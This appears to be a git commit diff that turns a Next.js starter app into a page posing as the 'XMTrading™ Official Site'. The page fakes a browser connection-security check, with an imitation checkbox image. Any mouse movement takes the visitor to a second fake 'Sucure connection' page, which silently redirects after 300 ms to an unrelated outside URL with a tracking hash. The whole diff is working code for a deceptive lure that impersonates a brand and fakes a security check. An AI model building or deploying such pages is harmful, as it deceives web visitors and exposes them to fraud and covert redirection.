d75f5c7bd6154111b6272b264bbdfdd83f2da4e1
vietnv-mmo <nguyenvanvietbn1998@gmail.com>
2025-04-08 16:24:25 +0700

    first commit

--- src/app/page.js
+++ src/app/page.js
@@ -1,95 +1,49 @@
-import Image from "next/image";
+'use client'
 import styles from "./page.module.css";
+import circel from "../../public/R-tron.png";
+import image from "../../public/image.png";
+import Image from "next/image";
+import { useEffect, useState } from "react";
 
 export default function Home() {
-  return (
-    <div className={styles.page}>
-      <main className={styles.main}>
-        <Image
-          className={styles.logo}
-          src="https://nextjs.org/icons/next.svg"
-          alt="Next.js logo"
-          width={180}
-          height={38}
-          priority
-        />
-        <ol>
-          <li>
-            Get started by editing <code>src/app/page.js</code>.
-          </li>
-          <li>Save and see your changes instantly.</li>
-        </ol>
 
-        <div className={styles.ctas}>
-          <a
-            className={styles.primary}
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
+  const handleClick = () => {
+      window.location.href = "/xmtrading-connecting"; 
+  }
+
+  return (
+    <div
+      onMouseMove={handleClick}
+      // onClick={handleClick}
+    >
+      <main className={styles.main}>
+        <h3 className={styles.text}>
+          XMTrading™ Official Site{" "}
+          <span
+            style={{ transform: "translate(0px)", display: "inline-block" }}
           >
-            <Image
-              className={styles.logo}
-              src="https://nextjs.org/icons/vercel.svg"
-              alt="Vercel logomark"
-              width={20}
-              height={20}
-            />
-            Deploy now
-          </a>
-          <a
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-            className={styles.secondary}
-          >
-            Read our docs
-          </a>
+            <Image src={circel} alt="Logo" width={30} height={30} priority />
+          </span>
+        </h3>
+        <p className={styles.text2}>
+          Checking if the site connection is secure
+        </p>
+        <p className={styles.text3}>
+          We needs to review the security of your connection before proceeding
+          XMTrading™
+        </p>
+       
+        <div style={{ marginTop: 30, position: "relative" }}>
+          <Image src={image} alt="Logo" className={styles.image2} />
+          <input type="checkbox" className={styles.checkbox} />
         </div>
+        <p className={styles.text4}>Why am I seeing this page?</p>
+        <p className={styles.text5}>
+          Requests from malicious bots can pose as legitimate traffic.
+          Occasionally, you may see this page while the site ensures that the
+          connection is secure.
+        </p>
       </main>
-      <footer className={styles.footer}>
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="https://nextjs.org/icons/file.svg"
-            alt="File icon"
-            width={16}
-            height={16}
-          />
-          Learn
-        </a>
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="https://nextjs.org/icons/window.svg"
-            alt="Window icon"
-            width={16}
-            height={16}
-          />
-          Examples
-        </a>
-        <a
-          href="https://nextjs.org?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="https://nextjs.org/icons/globe.svg"
-            alt="Globe icon"
-            width={16}
-            height={16}
-          />
-          Go to nextjs.org →
-        </a>
-      </footer>
     </div>
   );
 }
---
+++ src/app/xmtrading-connecting/page.js
@@ -0,0 +1,41 @@
+'use client'
+import styles from "./page.module.css";
+import Image from "next/image";
+import circel from "../../../public/R-tron.png";
+import { FcOk } from "react-icons/fc";
+import { useEffect } from "react";
+
+export default function page() {
+    useEffect(() => {
+      const timeout = setTimeout(() => {
+        window.location.href = "https://www.mediamister.com/#676bd8979a965";
+      }, 300);
+      return () => clearTimeout(timeout);
+      }, []);
+  return (
+    <div>
+      <main className={styles.main}>
+        <h3 className={styles.text}>
+        XMTrading™ Official Site{" "}
+          <span
+            style={{ transform: "translate(0px)", display: "inline-block" }}
+          >
+            <Image src={circel} alt="Logo" width={30} height={30} priority />
+          </span>
+        </h3>
+        <p className={styles.text2}>
+          Checking if the site connection is secure
+        </p>
+        <p className={styles.text3}>
+          We needs to review the security of your connection before proceeding
+          XMTrading™
+        </p>
+        <div style={{ marginTop: 30 }}>
+          <span style={{display: 'inline-block', transform: 'translateY(8px)'}}><FcOk fontSize={30}/></span><span style={{marginLeft: 5}}>Sucure connection</span>
+        </div>
+        <p className={styles.text4}>Proceeding...</p>
+       
+      </main>
+    </div>
+  );
+}
